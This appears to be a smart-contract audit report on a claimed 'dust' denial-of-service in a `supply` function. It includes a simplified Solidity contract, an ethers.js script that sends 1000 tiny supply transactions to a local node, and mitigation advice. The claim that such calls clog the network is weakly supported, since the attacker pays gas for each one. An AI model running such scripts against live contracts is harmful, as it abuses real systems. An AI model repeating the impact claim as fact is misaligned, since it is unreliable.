# Vulnerability details

## Impact
The ```supply``` function in ```SupplyLogic.sol``` takes an argument ```_amount``` and validates it for only positive values using the ```require()``` statement. However, an attacker could indeed use very small amounts ("dust") to continually invoke the supply function, leading to unnecessary execution and network congestion. This attack would clog the network by sending numerous transactions that consume gas, even if they pass the basic ```_amount``` validation, thereby, eventually leading to DoS.

## Proof of Concept
For brevity, the following PoC uses ```VulnerableContract``` (a simplified version of the original contract) and the attack script is written with ```ethers.js```(although web3.js could also be used):
1. Vulnerable Contract:

--> The supply function does not have a minimum amount check, allowing any positive _amount to be processed.
--> The addPair function is provided for testing purposes to set up pairs in the contract.
```solidity

contract VulnerableContract {
    event TokenSupplied(address indexed sender, uint256 pairId, bool isStable, uint256 amount);

    struct PairStatus {
        uint256 id;
        address quotePool;
        address basePool;
    }

    mapping(uint256 => PairStatus) public pairs;

    function supply(uint256 _pairId, uint256 _amount, bool _isStable) external {
        // Validate the amount
        require(_amount > 0, "Invalid amount");

        // Apply interest rates for the token in the pair (simulated as a no-op for PoC)
        // ApplyInterestLib.applyInterestForToken(globalData.pairs, _pairId);

        // Retrieve the pair status
        PairStatus storage pair = pairs[_pairId];

        // Validate the pools
        if (_isStable) {
            require(address(pair.quotePool) != address(0), "Invalid quote pool");
            // Simulate receiving token and minting bond
        } else {
            require(address(pair.basePool) != address(0), "Invalid base pool");
            // Simulate receiving token and minting bond
        }

        // Emit the event
        emit TokenSupplied(msg.sender, _pairId, _isStable, _amount);
    }

    // Utility function to add pairs for testing
    function addPair(uint256 _pairId, address _quotePool, address _basePool) external {
        pairs[_pairId] = PairStatus({id: _pairId, quotePool: _quotePool, basePool: _basePool});
    }
}

```

2. Attack Script:

--> The script uses ethers.js to interact with the smart contract.
--> It first adds a pair for testing.
--> It then sends 1000 small transactions (0.0001 ether) to the supply function to simulate a dust attack.
```javascript
const { ethers } = require("ethers");

// Setup
const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545");
const attackerWallet = new ethers.Wallet("YOUR_PRIVATE_KEY", provider);
const contractAddress = "YOUR_CONTRACT_ADDRESS";
const contractABI = [
    "function supply(uint256 _pairId, uint256 _amount, bool _isStable) external",
    "function addPair(uint256 _pairId, address _quotePool, address _basePool) external"
];

// Create contract instance
const contract = new ethers.Contract(contractAddress, contractABI, attackerWallet);

async function main() {
    // Add a pair for testing
    const pairId = 1;
    const quotePool = "0x0000000000000000000000000000000000000001"; // Dummy address
    const basePool = "0x0000000000000000000000000000000000000002"; // Dummy address

    await contract.addPair(pairId, quotePool, basePool);

    // Attack: Send many small transactions
    for (let i = 0; i < 1000; i++) {
        try {
            const tx = await contract.supply(pairId, ethers.utils.parseUnits("0.0001", "ether"), true);
            console.log(`Transaction ${i} sent: ${tx.hash}`);
            await tx.wait();
            console.log(`Transaction ${i} confirmed`);
        } catch (error) {
            console.error(`Transaction ${i} failed:`, error);
        }
    }
}

main().catch((error) => {
    console.error(error);
    process.exit(1);
});

```
This consequently clogs the network and ultimately leads to Denial of Service.
## Tools Used
ethers.js
## Recommended Mitigation Steps
1. Minimum Amount Check: Introduce a minimum threshold for _amount to prevent dust transactions from being processed, reducing the risk of network congestion.
2. Dynamic Threshold: Implement a mechanism to adjust the minimum threshold as needed to adapt to changing conditions and potential attack strategies.
3. Efficiency: Ensure that all necessary checks are performed early in the function to avoid unnecessary execution and conserve gas.
